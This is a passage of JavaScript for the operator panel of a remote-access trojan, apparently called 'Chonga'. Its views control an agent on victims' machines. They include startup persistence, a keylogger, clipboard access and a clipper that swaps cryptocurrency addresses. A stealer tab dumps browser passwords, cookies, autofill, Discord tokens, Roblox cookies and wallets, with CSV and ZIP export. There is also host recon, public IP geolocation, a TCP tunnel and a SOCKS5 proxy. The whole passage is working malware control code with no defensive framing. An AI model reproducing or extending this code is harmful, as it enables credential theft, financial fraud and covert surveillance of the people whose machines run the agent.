          try { await cmd("startup_remove", { name: b.dataset.rm }); toast("Removed", "ok"); load(); }
          catch (e) { fail(e); }
        });
      } catch (e) { $("#sList", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#sRefresh", v).onclick = (e) => run(e.currentTarget, load);
    $("#sAdd", v).onclick = () => {
      const m = modal("Add startup entry",
        '<div class="form-stack"><div class="field"><label>Name</label><input class="input" id="saName" placeholder="ChongaAgent"></div>' +
        '<div class="field"><label>Command</label><input class="input mono" id="saCmd" placeholder="C:\\path\\to\\app.exe"></div>' +
        '<label class="check"><input type="checkbox" id="saFolder"><span><b>Use startup folder</b><small>Writes a .cmd instead of HKCU\\Run</small></span></label></div>',
        '<button class="btn btn-primary" data-ok>Add</button>');
      $("[data-ok]", m.el).onclick = async (ev) => {
        busy(ev.currentTarget, true);
        try {
          await cmd("startup_add", {
            name: $("#saName", m.el).value.trim(),
            command: $("#saCmd", m.el).value.trim(),
            folder: $("#saFolder", m.el).checked,
          });
          m.close(); toast("Entry added", "ok"); load();
        } catch (e) { fail(e); }
        busy(ev.currentTarget, false);
      };
    };
    load();
  },
};

/* ================================================================ keylogger */
VIEWS.keylog = {
  title: "Keylogger",
  sub: "Buffered keystrokes streamed as events",
  render() {
    if (!S.connected) return offlineCard("The keylogger needs a live agent.");
    return pageHead("Keylogger", "Keystrokes arrive live over the event stream.",
      '<button class="btn btn-sm btn-primary" id="kStart">' + icon("play") + ' Start</button>' +
      '<button class="btn btn-sm" id="kStop">' + icon("stop") + ' Stop</button>' +
      '<button class="btn btn-sm" id="kDump">' + icon("download") + ' Flush</button>' +
      '<button class="btn btn-sm" id="kSave">Save</button>') +
      requireFeature("keylog") +
      '<div class="card pad"><textarea class="textarea" id="keylogText" style="min-height:420px" placeholder="No keystrokes captured yet.">' + esc(S.keylog.text) + "</textarea></div>";
  },
  mount(v) {
    const box = $("#keylogText", v);
    box.addEventListener("input", () => { S.keylog.text = box.value; });
    $("#kStart", v).onclick = (e) => run(e.currentTarget, async () => { await cmd("keylog_start"); S.keylog.on = true; toast("Keylogger started", "ok"); });
    $("#kStop", v).onclick = (e) => run(e.currentTarget, async () => { await cmd("keylog_stop"); S.keylog.on = false; toast("Keylogger stopped", "ok"); });
    $("#kDump", v).onclick = (e) => run(e.currentTarget, async () => { await cmd("keylog_dump"); toast("Buffer flushed to the event stream", "ok"); });
    $("#kSave", v).onclick = () => {
      const blob = new Blob([S.keylog.text], { type: "text/plain" });
      const a = document.createElement("a");
      a.href = URL.createObjectURL(blob); a.download = "keylog-" + Date.now() + ".txt"; a.click();
      setTimeout(() => URL.revokeObjectURL(a.href), 3000);
    };
  },
};

/* ================================================================ clipboard */
VIEWS.clipboard = {
  title: "Clipboard",
  sub: "Read and write the agent clipboard",
  render() {
    if (!S.connected) return offlineCard("The clipboard module needs a live agent.");
    return pageHead("Clipboard", "Plain-text clipboard over Win32.",
      '<button class="btn btn-sm" id="cGet">' + icon("refresh") + ' Read</button>' +
      '<button class="btn btn-sm btn-primary" id="cSet">' + icon("upload") + ' Write</button>') +
      requireFeature("clipboard") +
      '<div class="grid grid-2"><div class="card pad">' +
        '<div class="stat-label" style="margin-bottom:8px">Agent clipboard</div>' +
        '<textarea class="textarea" id="cText" style="min-height:260px" placeholder="Read the clipboard or type text to write."></textarea>' +
        '<div class="hstack" style="margin-top:8px"><button class="btn btn-sm" id="cCopy">' + icon("copy") + ' Copy to this panel</button>' +
        '<span class="small muted" id="cMeta"></span></div></div>' +
        '<div class="card"><div class="card-head"><h3>History</h3><div class="right"><button class="btn btn-sm btn-ghost" id="cClear">Clear</button></div></div>' +
        '<div class="card-body flush" id="cList"><div class="empty">Nothing read yet.</div></div></div></div>';
  },
  mount(v) {
    const paint = () => {
      $("#cList", v).innerHTML = table(["Time", "Text"], S.clip.history, (x) =>
        '<tr><td class="small muted nowrap">' + esc(timeOf(x.ts)) + '</td><td class="mono trunc">' + esc(x.text) +
        '</td><td><button class="btn btn-sm" data-use="' + esc(btoa(unescape(encodeURIComponent(x.text)))) + '">Use</button></td></tr>',
        "Nothing read yet.");
      $$("[data-use]", v).forEach((b) => b.onclick = () => {
      try { $("#cText", v).value = decodeURIComponent(escape(atob(b.dataset.use))); } catch (e) { /* ignore */ }
      });
    };
    $("#cGet", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("clipboard_get");
      const text = r.text || "";
      $("#cText", v).value = text;
      $("#cMeta", v).textContent = text.length + " chars";
      S.clip.history.unshift({ ts: Date.now() / 1000, text });
      S.clip.history = S.clip.history.slice(0, 50);
      paint();
    });
    $("#cSet", v).onclick = (e) => run(e.currentTarget, async () => {
      await cmd("clipboard_set", { text: $("#cText", v).value });
      toast("Clipboard written", "ok");
    });
    $("#cCopy", v).onclick = () => copyText($("#cText", v).value);
    $("#cClear", v).onclick = () => { S.clip.history = []; paint(); };
    paint();
  },
};

/* ================================================================== clipper */
VIEWS.clipper = {
  title: "Clipper",
  sub: "Swap crypto addresses in the agent clipboard",
  render() {
    if (!S.connected) return offlineCard("The clipper needs a live agent.");
    return pageHead("Clipboard clipper", "Watches the clipboard and replaces matching addresses.",
      '<button class="btn btn-sm btn-primary" id="clStart">' + icon("play") + ' Start</button>' +
      '<button class="btn btn-sm" id="clStop">' + icon("stop") + ' Stop</button>') +
      requireFeature("clipper") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 340px">' +
        '<div class="card"><div class="card-head"><h3>Replacements</h3><div class="right"><button class="btn btn-sm btn-ghost" id="clRefresh">' + icon("refresh") + '</button></div></div>' +
          '<div class="card-body flush" id="clHits"><div class="empty">No hits yet.</div></div></div>' +
        '<div class="card pad form-stack">' +
          '<div class="field"><label>Bitcoin</label><input class="input mono" id="clBtc" placeholder="bc1..."></div>' +
          '<div class="field"><label>Ethereum</label><input class="input mono" id="clEth" placeholder="0x..."></div>' +
          '<div class="field"><label>Litecoin</label><input class="input mono" id="clLtc" placeholder="ltc1..."></div>' +
          '<div class="field"><label>Monero</label><input class="input mono" id="clXmr" placeholder="4..."></div>' +
          '<div class="field"><label>Solana</label><input class="input mono" id="clSol" placeholder="..."></div>' +
          '<button class="btn btn-primary" id="clApply">' + icon("check") + ' Apply addresses</button>' +
          '<div class="note">' + icon("info") + '<div>Only addresses present in this form are substituted. Hits appear live.</div></div>' +
        '</div></div>';
  },
  mount(v) {
    const paint = () => {
      const rows = S.clipper.hits;
      const host = $("#clHits", v);
      if (!host) return;
      host.innerHTML = table(["Coin", "From", "To"], rows, (h) =>
        '<tr><td><span class="badge violet">' + esc(h.coin) + '</span></td><td class="mono trunc">' + esc(h.from) +
        '</td><td class="mono trunc">' + esc(h.to) + "</td></tr>", "No hits yet.");
    };
    $("#clApply", v).onclick = (e) => run(e.currentTarget, async () => {
      const addrs = {
        btc: $("#clBtc", v).value.trim(), eth: $("#clEth", v).value.trim(),
        ltc: $("#clLtc", v).value.trim(), xmr: $("#clXmr", v).value.trim(),
        sol: $("#clSol", v).value.trim(),
      };
      Object.keys(addrs).forEach((k) => { if (!addrs[k]) delete addrs[k]; });
      const r = await cmd("clipper_start", addrs);
      toast("Clipper running: " + (r.coins || []).join(", "), "ok");
    });
    $("#clStop", v).onclick = (e) => run(e.currentTarget, async () => { await cmd("clipper_stop"); toast("Clipper stopped", "ok"); });
    $("#clRefresh", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("clipper_hits");
      S.clipper.hits = r.hits || [];
      paint();
    });
    paint();
  },
};

function paintClipperHits() {
  const host = $("#clHits");
  if (!host || S.route !== "clipper") return;
  host.innerHTML = table(["Coin", "From", "To"], S.clipper.hits, (h) =>
    '<tr><td><span class="badge violet">' + esc(h.coin) + '</span></td><td class="mono trunc">' + esc(h.from) +
    '</td><td class="mono trunc">' + esc(h.to) + "</td></tr>", "No hits yet.");
}

/* ================================================================= stealer */
const STEAL_TABS = [
  ["cookies", "Cookies", "steal_cookies"],
  ["history", "History", "steal_history"],
  ["autofill", "Autofill", "steal_autofill"],
  ["passwords", "Passwords", "steal_passwords"],
  ["discord", "Discord", "steal_discord"],
  ["roblox", "Roblox", "steal_roblox"],
  ["wallets", "Wallets", "steal_wallets"],
  ["extensions", "Extensions", "steal_extensions"],
];

/* ------------------------------------------------------------ steal cache --
   A collection outlives the socket. Results are keyed by client id and kept in
   localStorage, so closing the panel, restarting the agent or losing the link
   never throws away what was already pulled off the machine. */
function stealCacheKey() {
  return "chonga.steal." + (S.client || "none");
}
function stealCacheLoad() {
  try {
    const raw = localStorage.getItem(stealCacheKey());
    if (!raw) return null;
    const o = JSON.parse(raw);
    if (!o || !o.data || typeof o.data !== "object") return null;
    return o;
  } catch (e) {
    return null;
  }
}
function stealCacheSave() {
  try {
    localStorage.setItem(stealCacheKey(), JSON.stringify({ data: S.steal.data, ts: Date.now() }));
  } catch (e) {
    /* quota is the only realistic failure; the live view still works */
  }
}
function ago(ts) {
  if (!ts) return "unknown";
  const s = Math.max(0, Math.round((Date.now() - ts) / 1000));
  if (s < 60) return s + "s ago";
  if (s < 3600) return Math.round(s / 60) + "m ago";
  if (s < 86400) return Math.round(s / 3600) + "h ago";
  return Math.round(s / 86400) + "d ago";
}
function toCsv(cols, rows) {
  const q = (v) => '"' + String(v == null ? "" : v).replace(/"/g, '""') + '"';
  return "\ufeff" + [cols.map(q).join(",")].concat((rows || []).map((r) => r.map(q).join(","))).join("\r\n");
}
function saveText(text, name, mime) {
  const blob = new Blob([text], { type: mime || "text/plain;charset=utf-8" });
  const a = document.createElement("a");
  a.href = URL.createObjectURL(blob);
  a.download = name;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(a.href), 4000);
}

VIEWS.stealer = {
  title: "Stealer",
  sub: "Chromium cookies, logins, tokens and wallet inventory",
  render() {
    const offline = !S.connected;
    const snap = stealCacheLoad();
    if (offline && !snap) {
      return offlineCard("The stealer needs a live agent — nothing has been collected from this client yet.");
    }
    if (offline) {
      S.steal.data = snap.data;
      if (S.steal.tab === "archive" || !S.steal.data[S.steal.tab]) S.steal.tab = "cookies";
    }
    const banner = offline
      ? '<div class="note warn" style="margin-bottom:12px">' + icon("alert") +
        "<div><b>This client is offline.</b> Showing the last collection, " + esc(ago(snap.ts)) +
        ". The data stays readable and downloadable; refreshing needs the agent back.</div></div>"
      : "";
    return pageHead("Credential recovery", "DPAPI + AES-GCM against local browser profiles.",
      '<button class="btn btn-sm" id="stRefresh"' + (offline ? " disabled" : "") + ">" + icon("refresh") + ' Refresh</button>' +
      '<button class="btn btn-sm" id="stCsv">' + icon("download") + ' Download CSV</button>' +
      '<button class="btn btn-sm" id="stExport">' + icon("download") + ' Download JSON</button>') +
      banner +
      (offline ? "" : requireFeature("stealer")) +
      '<div class="tabs" id="stTabs">' + STEAL_TABS.map((t) =>
        '<button class="tab' + (S.steal.tab === t[0] ? " active" : "") + '" data-tab="' + t[0] + '">' + t[1] + "</button>").join("") +
        '<button class="tab' + (S.steal.tab === "archive" ? " active" : "") + '" data-tab="archive">Archive</button></div>' +
      '<div class="card" style="margin-top:12px"><div class="card-head"><h3 id="stTitle">Cookies</h3>' +
        '<div class="right" id="stActions"></div></div>' +
        '<div class="card-body flush" id="stBody"><div class="empty">Loading…</div></div></div>';
  },
  mount(v) {
    const offline = !S.connected;
    const load = async (tab) => {
      S.steal.tab = tab;
      $$(".tab", v).forEach((b) => b.classList.toggle("active", b.dataset.tab === tab));
      const body = $("#stBody", v);
      const title = $("#stTitle", v);
      const actions = $("#stActions", v);
      if (tab === "archive") {
        title.textContent = "Archive";
        actions.innerHTML = "";
        S.steal.csv = null;
        if (offline) {
          body.innerHTML = '<div class="card-body"><div class="empty">Building an archive needs a live agent.</div></div>';
          return;
        }
        body.innerHTML = '<div class="card-body"><p class="small muted">One archive of every collector, or just the files.</p>' +
          '<div class="btn-row"><button class="btn btn-primary" id="arcAll">' + icon("box") + ' Everything</button>' +
          '<button class="btn" id="arcWallets">' + icon("box") + ' Wallet archive</button>' +
          '<button class="btn" id="arcExt">' + icon("box") + ' Extension archive</button></div></div>';
        $("#arcAll", body).onclick = (e) => run(e.currentTarget, async () => {
          const r = await cmd("steal_all", {}, 180);
          download(r.archive, "collect-" + Date.now() + ".zip", "application/zip");
          const parts = Object.keys(r.counts || {}).map((k) => k + " " + r.counts[k]).join(" · ");
          toast("Collected " + r.total + " rows", "ok");
          body.querySelector("p").textContent = parts || "empty";
        });
        $("#arcWallets", body).onclick = (e) => run(e.currentTarget, async () => {
          const r = await cmd("steal_archive", { kind: "wallets" }, 90);
          download(r.zip, "wallets-" + Date.now() + ".zip", "application/zip");
          toast("Archive built: " + r.files + " files", "ok");
        });
        $("#arcExt", body).onclick = (e) => run(e.currentTarget, async () => {
          const r = await cmd("steal_archive", { kind: "extensions" }, 90);
          download(r.zip, "extensions-" + Date.now() + ".zip", "application/zip");
          toast("Archive built: " + r.files + " files", "ok");
        });
        return;
      }
      const meta = STEAL_TABS.find((t) => t[0] === tab);
      title.textContent = meta[1];
      if (offline) {
        if (!S.steal.data[tab]) {
          actions.innerHTML = "";
          body.innerHTML = '<div class="card-body"><div class="empty">' + esc(meta[1]) +
            " was not part of the last collection.</div></div>";
          return;
        }
        paintSteal(v);
        return;
      }
      body.innerHTML = '<div class="empty"><span class="spin"></span>&nbsp; Reading ' + esc(meta[1].toLowerCase()) + "…</div>";
      try {
        const r = await cmd(meta[2], {}, 120);
        S.steal.data[tab] = r;
        stealCacheSave();
        paintSteal(v);
      } catch (e) {
        if (S.steal.data[tab]) {
          paintSteal(v);
          toast("Live read failed — showing the last collection", "err");
        } else {
          body.innerHTML = '<div class="empty">' + esc(e.message) + "</div>";
        }
      }
    };
    $$(".tab", v).forEach((b) => b.onclick = () => load(b.dataset.tab));
    $("#stRefresh", v).onclick = (e) => {
      if (offline) return toast("The agent is offline", "err");
      run(e.currentTarget, () => load(S.steal.tab === "archive" ? "cookies" : S.steal.tab));
    };
    $("#stCsv", v).onclick = () => {
      const c = S.steal.csv;
      if (!c || !c.rows.length) return toast("Nothing loaded for this tab", "err");
      const stamp = new Date().toISOString().slice(0, 19).replace(/[:T]/g, "-");
      saveText(toCsv(c.cols, c.rows), "chonga-" + S.steal.tab + "-" + stamp + ".csv", "text/csv;charset=utf-8");
      toast("CSV: " + c.rows.length + " rows", "ok");
    };
    $("#stExport", v).onclick = () => {
      const data = S.steal.data[S.steal.tab];
      if (!data) return toast("Nothing loaded for this tab", "err");
      const stamp = new Date().toISOString().slice(0, 19).replace(/[:T]/g, "-");
      saveText(JSON.stringify(data, null, 2), "chonga-" + S.steal.tab + "-" + stamp + ".json", "application/json");
      toast("JSON exported", "ok");
    };
    load(S.steal.tab === "archive" ? "cookies" : S.steal.tab);
  },
};

function paintSteal(v) {
  const tab = S.steal.tab;
  const data = S.steal.data[tab] || {};
  const body = $("#stBody", v);
  const actions = $("#stActions", v);
  if (!body) return;
  let rows = [], cols = [], row = null, cells = null, count = 0;
  if (tab === "cookies") {
    rows = data.cookies || []; cols = ["Browser", "Host", "Name", "Value"];
    cells = (c) => [c.browser, c.host, c.name, c.value];
    row = (c) => '<tr><td class="small">' + esc(c.browser) + "</td><td>" + esc(c.host) + "</td><td>" + esc(c.name) +
      '</td><td class="mono trunc">' + esc(c.value) + "</td></tr>";
  } else if (tab === "history") {
    rows = data.history || []; cols = ["Browser", "Title", "URL", "Last"];
    cells = (h) => [h.browser, h.title, h.url, h.last || ""];
    row = (h) => '<tr><td class="small">' + esc(h.browser) + '</td><td class="trunc">' + esc(h.title) +
      '</td><td class="mono trunc">' + esc(h.url) + '</td><td class="small muted nowrap">' + esc(h.last || "—") + "</td></tr>";
  } else if (tab === "autofill") {
    rows = data.entries || []; cols = ["Browser", "Field", "Value"];
    cells = (a) => [a.browser, a.field, a.value];
    row = (a) => '<tr><td class="small">' + esc(a.browser) + "</td><td>" + esc(a.field) +
      '</td><td class="mono trunc">' + esc(a.value) + "</td></tr>";
  } else if (tab === "passwords") {
    rows = data.accounts || []; cols = ["Browser", "URL", "Username", "Password"];
    const sealed = (p) => /^<(app-bound|locked|undecryptable)/.test(p || "");
    cells = (a) => [a.browser, a.url, a.username, a.password];
    row = (a) => '<tr><td class="small">' + esc(a.browser) + '</td><td class="mono trunc">' + esc(a.url) +
      "</td><td>" + esc(a.username) + '</td><td class="mono">' +
      (sealed(a.password)
        ? '<span class="badge" title="' + esc(a.password) + '">sealed</span>'
        : esc(a.password)) + "</td></tr>";
  } else if (tab === "discord") {
    rows = (data.tokens || []).map((t) => ({ token: t })); cols = ["Token"];
    cells = (t) => [t.token];
    row = (t) => '<tr><td class="mono trunc">' + esc(t.token) + '</td><td><button class="btn btn-sm" data-cp="' + esc(t.token) + '">Copy</button></td></tr>';
  } else if (tab === "roblox") {
    rows = data.cookies || []; cols = ["Host", "Name", "Value"];
    cells = (c) => [c.host, c.name, c.value];
    row = (c) => '<tr><td>' + esc(c.host) + "</td><td>" + esc(c.name) + '</td><td class="mono trunc">' + esc(c.value) + "</td></tr>";
  } else if (tab === "wallets") {
    rows = data.wallets || []; cols = ["Path", "Kind", "Size"];
    cells = (w) => [w.path, w.kind, w.size];
    row = (w) => '<tr><td class="mono trunc">' + esc(w.path) + '</td><td><span class="badge">' + esc(w.kind) +
      '</span></td><td class="num">' + bytes(w.size) + "</td></tr>";
    count = data.total;
  } else if (tab === "extensions") {
    rows = data.extensions || []; cols = ["Browser", "Name", "Version", "ID"];
    cells = (e) => [e.browser, e.name, e.version, e.id];
    row = (e) => '<tr><td class="small">' + esc(e.browser) + "</td><td>" + esc(e.name) + '</td><td class="mono">' + esc(e.version) +
      '</td><td class="mono trunc">' + esc(e.id) + "</td></tr>";
  }
  S.steal.csv = { cols: cols, rows: cells ? rows.map(cells) : [] };
  actions.innerHTML = '<span class="badge">' + rows.length + " rows</span>" +
    (count ? '<span class="badge">' + bytes(count) + "</span>" : "");
  const notes = data.notes || [];
  body.innerHTML = (notes.length
    ? '<div class="note warn" style="margin:0 0 10px">' + icon("alert") + "<div>" +
      notes.slice(0, 6).map((n) => esc(n)).join("<br>") + "</div></div>"
    : "") + table(cols, rows, row, "Nothing found in the local profiles.");
  $$("[data-cp]", body).forEach((b) => b.onclick = () => copyText(b.dataset.cp));
}

/* ============================================================= connections */
VIEWS.connections = {
  title: "Connections",
  sub: "TCP and UDP sockets with the owning process",
  render() {
    if (!S.connected) return offlineCard("Connection inventory needs a live agent.");
    return pageHead("Network connections", "psutil snapshot of the agent host.",
      '<button class="btn btn-sm" id="cnRefresh">' + icon("refresh") + ' Refresh</button>') +
      requireFeature("recon") +
      '<div class="card"><div class="card-head"><input class="input" id="cnFilter" placeholder="Filter process, address or port" style="max-width:380px">' +
        '<div class="right"><span class="badge" id="cnCount">0</span></div></div>' +
        '<div class="card-body flush" id="cnList"><div class="empty">Loading…</div></div></div>';
  },
  mount(v) {
    const paint = () => {
      const q = S.conns.filter.toLowerCase();
      const rows = S.conns.rows.filter((c) =>
        !q || (c.process || "").toLowerCase().includes(q) || (c.local || "").includes(q) ||
        (c.remote || "").includes(q) || (c.status || "").toLowerCase().includes(q));
      $("#cnList", v).innerHTML = table(["Process", "PID", "Proto", "Local", "Remote", "State"], rows, (c) =>
        '<tr><td>' + esc(c.process || "—") + '</td><td class="mono">' + (c.pid || "—") +
        '</td><td><span class="badge">' + esc(c.proto) + "/" + esc(c.family) + '</span></td><td class="mono">' + esc(c.local) +
        '</td><td class="mono">' + esc(c.remote || "—") + '</td><td class="small muted">' + esc(c.status) + "</td></tr>",
        "No sockets.");
      $("#cnCount", v).textContent = rows.length;
    };
    const load = async () => {
      try {
        const r = await cmd("connections", {}, 40);
        S.conns.rows = r.connections || [];
        paint();
      } catch (e) { $("#cnList", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#cnFilter", v).oninput = (e) => { S.conns.filter = e.target.value; paint(); };
    $("#cnRefresh", v).onclick = (e) => run(e.currentTarget, load);
    load();
    every(() => { if (S.route === "connections") load(); }, 15000);
  },
};

/* =================================================================== recon */
VIEWS.recon = {
  title: "Recon & geo",
  sub: "Local network facts, public lookup, recycle bin",
  render() {
    if (!S.connected) return offlineCard("Recon needs a live agent.");
    return pageHead("Recon", "Everything local by default; the public lookup is explicit.",
      '<button class="btn btn-sm" id="rcOnline">' + icon("globe") + ' Resolve public IP</button>' +
      '<button class="btn btn-sm" id="rcRefresh">' + icon("refresh") + ' Refresh recycle bin</button>') +
      requireFeature("recon") +
      '<div class="grid grid-2">' +
        '<div class="card"><div class="card-head"><h3>Host facts</h3></div><div class="card-body" id="rcGeo"><div class="empty">Loading…</div></div></div>' +
        '<div class="card"><div class="card-head"><h3>Public lookup</h3><p>Only on request</p></div><div class="card-body" id="rcPublic">' +
          '<div class="empty">' + icon("globe") + 'No lookup performed.</div></div></div>' +
      '</div>' +
      '<div class="card" style="margin-top:16px"><div class="card-head"><h3>Recycle bin</h3><div class="right"><span class="badge" id="rcCount">0</span></div></div>' +
        '<div class="card-body flush" id="rcBin"><div class="empty">Loading…</div></div></div>';
  },
  mount(v) {
    const loadGeo = async () => {
      try {
        const g = await cmd("geo", {}, 30);
        $("#rcGeo", v).innerHTML = kv([
          ["Hostname", g.hostname], ["Timezone", g.timezone + " (UTC" + (g.utc_offset >= 0 ? "+" : "") + Math.round(g.utc_offset / 3600) + ")"],
          ["Gateway", g.gateway || "—"],
        ]) + '<div class="divider"></div><div class="stat-label" style="margin-bottom:8px">Interfaces</div>' +
          Object.keys(g.interfaces || {}).map((k) =>
            '<div class="spread" style="padding:4px 0"><span class="small">' + esc(k) + '</span><span class="mono small muted">' +
            esc((g.interfaces[k] || []).join(", ")) + "</span></div>").join("");
      } catch (e) { $("#rcGeo", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    const loadBin = async () => {
      try {
        const r = await cmd("recycle_list", {}, 40);
        const rows = r.items || [];
        $("#rcBin", v).innerHTML = table(["Name", "Deleted", "Size", "Path", ""], rows, (x) =>
          '<tr><td>' + esc(x.Name) + '</td><td class="small muted">' + esc(String(x.Deleted || "").replace("T", " ")) +
          '</td><td class="num">' + bytes(x.Size) + '</td><td class="mono trunc">' + esc(x.Path) +
          '</td><td><button class="btn btn-sm" data-restore="' + esc(x.Name) + '">Restore</button></td></tr>', "Recycle bin is empty.");
        $("#rcCount", v).textContent = rows.length;
        $$("[data-restore]", v).forEach((b) => b.onclick = (e) => run(e.currentTarget, async () => {
          await cmd("recycle_restore", { name: b.dataset.restore });
          toast("Restored " + b.dataset.restore, "ok");
          loadBin();
        }));
      } catch (e) { $("#rcBin", v).innerHTML = '<div class="empty">' + esc(e.message) + "</div>"; }
    };
    $("#rcOnline", v).onclick = (e) => run(e.currentTarget, async () => {
      const m = modal("Public lookup", '<div class="empty"><span class="spin"></span>&nbsp; Contacting ipapi.co…</div>');
      try {
        const g = await cmd("geo", { online: true }, 30);
        const p = g.public || {};
        m.close();
        $("#rcPublic", v).innerHTML = g.public_error
          ? '<div class="empty">' + esc(g.public_error) + "</div>"
          : kv([
            ["Public IP", p.ip || "—"], ["City", p.city || "—"], ["Region", p.region || "—"],
            ["Country", (p.country_name || "—") + " (" + (p.country_code || "?") + ")"],
            ["Postal", p.postal || "—"], ["Org", p.org || "—"], ["ASN", p.asn || "—"],
            ["Latitude", p.latitude], ["Longitude", p.longitude], ["Timezone", p.timezone || "—"],
          ]);
      } catch (err) { m.close(); fail(err); }
    });
    $("#rcRefresh", v).onclick = (e) => run(e.currentTarget, loadBin);
    loadGeo();
    loadBin();
  },
};

/* ================================================================== tunnel */
VIEWS.tunnel = {
  title: "Tunnel",
  sub: "Raw TCP relay through the agent",
  render() {
    if (!S.connected) return offlineCard("The tunnel needs a live agent.");
    return pageHead("TCP tunnel", "Dial a host from the agent and exchange bytes.",
      '<button class="btn btn-sm btn-danger" id="tnClose">' + icon("x") + ' Close tunnel</button>') +
      requireFeature("proxy") +
      '<div class="grid" style="grid-template-columns:minmax(0,1fr) 300px">' +
        '<div class="card"><div class="card-head"><h3>Console</h3><p id="tnState">not connected</p></div>' +
          '<div class="card-body"><div class="term" id="tnTerm"></div>' +
            '<div class="hstack" style="margin-top:10px"><input class="input mono" id="tnInput" placeholder="bytes to send (text)" style="flex:1">' +
            '<button class="btn btn-primary" id="tnSend">Send</button></div></div></div>' +
        '<div class="card pad form-stack">' +
          '<div class="field"><label>Host</label><input class="input mono" id="tnHost" placeholder="127.0.0.1"></div>' +
          '<div class="field"><label>Port</label><input class="input mono" id="tnPort" type="number" value="80"></div>' +
          '<button class="btn btn-primary" id="tnOpen">' + icon("link") + ' Open tunnel</button>' +
          '<div class="divider"></div>' +
          '<div class="kv"><div>ID</div><div class="mono" id="tnId">—</div><div>Sent</div><div id="tnTx">0 B</div><div>Received</div><div id="tnRx">0 B</div></div>' +
          '<div class="note">' + icon("info") + '<div>The relay runs inside the agent process. Bytes are shown as UTF-8 with replacement.</div></div>' +
        '</div></div>';
  },
  mount(v) {
    const term = $("#tnTerm", v);
    const paint = () => {
      term.innerHTML = S.tunnel.lines.map((l) =>
        '<div><span class="' + l.kind + '">' + esc(l.text) + "</span></div>").join("") ||
        '<span class="meta">Open a tunnel, then send and receive.</span>';
      term.scrollTop = term.scrollHeight;
      const st = $("#tnState", v);
      if (st) st.textContent = S.tunnel.id ? "tunnel " + S.tunnel.id + " · " + S.tunnel.host + ":" + S.tunnel.port : "not connected";
      const id = $("#tnId", v); if (id) id.textContent = S.tunnel.id || "—";
      const tx = $("#tnTx", v); if (tx) tx.textContent = bytes(S.tunnel.tx);
      const rx = $("#tnRx", v); if (rx) rx.textContent = bytes(S.tunnel.rx);
    };
    const put = (kind, text) => { S.tunnel.lines.push({ kind, text }); if (S.tunnel.lines.length > 500) S.tunnel.lines.shift(); paint(); };
    $("#tnOpen", v).onclick = (e) => run(e.currentTarget, async () => {
      const host = $("#tnHost", v).value.trim();
      const port = Number($("#tnPort", v).value);
      if (!host || !port) throw new Error("host and port required");
      const r = await cmd("proxy_open", { host, port }, 20);
      S.tunnel = { id: r.id, host: r.host, port: r.port, rx: 0, tx: 0, lines: [], polling: true };
      paint();
      put("ok", "connected to " + host + ":" + port + " as " + r.id);
      const loop = async () => {
        if (!S.tunnel.id || S.route !== "tunnel" || S.tunnel.busy) return;
        S.tunnel.busy = true;
        try {
          const x = await cmd("proxy_recv", { id: S.tunnel.id, limit: 65536 }, 15);
          if (x.data) { put("out", b64Text(x.data)); }
          S.tunnel.tx = x.tx || 0;
          S.tunnel.rx = x.rx || 0;
          if (x.closed) { put("meta", "[peer closed]"); S.tunnel.id = ""; }
        } catch (err) { S.tunnel.id = ""; put("err", err.message); }
        S.tunnel.busy = false;
        paint();
        if (S.tunnel.id) later(loop, 350);
      };
      later(loop, 250);
    });
    const sendText = async () => {
      const text = $("#tnInput", v).value;
      if (!text || !S.tunnel.id) return;
      const b64 = btoa(unescape(encodeURIComponent(text + "\r\n")));
      const r = await cmd("proxy_send", { id: S.tunnel.id, data: b64 });
      S.tunnel.rx = r.tx;
      put("cmd", text);
      $("#tnInput", v).value = "";
      paint();
    };
    $("#tnSend", v).onclick = (e) => run(e.currentTarget, sendText);
    $("#tnInput", v).addEventListener("keydown", (e) => { if (e.key === "Enter") sendText().catch(fail); });
    $("#tnClose", v).onclick = (e) => run(e.currentTarget, async () => {
      if (!S.tunnel.id) return toast("No tunnel open");
      await cmd("proxy_close", { id: S.tunnel.id });
      put("meta", "[closed]");
      S.tunnel.id = "";
      paint();
    });
    paint();
  },
};

function b64Text(b64) {
  try { return decodeURIComponent(escape(atob(b64))); }
  catch (e) { try { return atob(b64); } catch (e2) { return "[binary]"; } }
}

/* =================================================================== proxy */
VIEWS.proxy = {
  title: "SOCKS5 proxy",
  sub: "Loopback listener on the agent host",
  render() {
    if (!S.connected) return offlineCard("The proxy needs a live agent.");
    return pageHead("SOCKS5 proxy", "CONNECT-only listener bound to 127.0.0.1 on the agent.",
      '<button class="btn btn-sm" id="pxRefresh">' + icon("refresh") + ' Status</button>') +
      requireFeature("proxy") +
      '<div class="grid grid-2">' +
        '<div class="card"><div class="card-head"><h3>Listener</h3><div class="right"><span class="badge" id="pxBadge">stopped</span></div></div>' +
          '<div class="card-body form-stack">' +
            '<div class="form-row"><div class="field"><label>Port</label><input class="input mono" id="pxPort" type="number" value="1080"></div>' +
              '<button class="btn btn-primary" id="pxStart">' + icon("play") + ' Start</button>' +
              '<button class="btn btn-danger" id="pxStop">' + icon("stop") + ' Stop</button></div>' +
            '<div class="note">' + icon("info") + '<div>Binds <b>127.0.0.1</b> only. Point a browser or curl at <span class="mono">socks5h://127.0.0.1:&lt;port&gt;</span>.</div></div>' +
          '</div></div>' +
        '<div class="card"><div class="card-head"><h3>Statistics</h3></div><div class="card-body" id="pxStats"><div class="empty">Not queried.</div></div></div>' +
      '</div>';
  },
  mount(v) {
    const paint = (s) => {
      $("#pxBadge", v).textContent = s.running ? "listening" : "stopped";
      $("#pxBadge", v).className = "badge " + (s.running ? "ok" : "");
      $("#pxStats", v).innerHTML = kv([
        ["Running", s.running ? "yes" : "no"],
        ["Port", s.port || "—"],
        ["Accepted", s.accepted || 0],
        ["Bytes relayed", bytes(s.bytes || 0)],
        ["Open tunnels", s.tunnels || 0],
      ]);
    };
    const refresh = async () => {
      try { paint(await cmd("proxy_status")); } catch (e) { /* ignore */ }
    };
    $("#pxRefresh", v).onclick = (e) => run(e.currentTarget, refresh);
    $("#pxStart", v).onclick = (e) => run(e.currentTarget, async () => {
      const r = await cmd("proxy_start", { port: Number($("#pxPort", v).value) || 1080 });
      toast("SOCKS5 listening on " + r.listening, "ok");
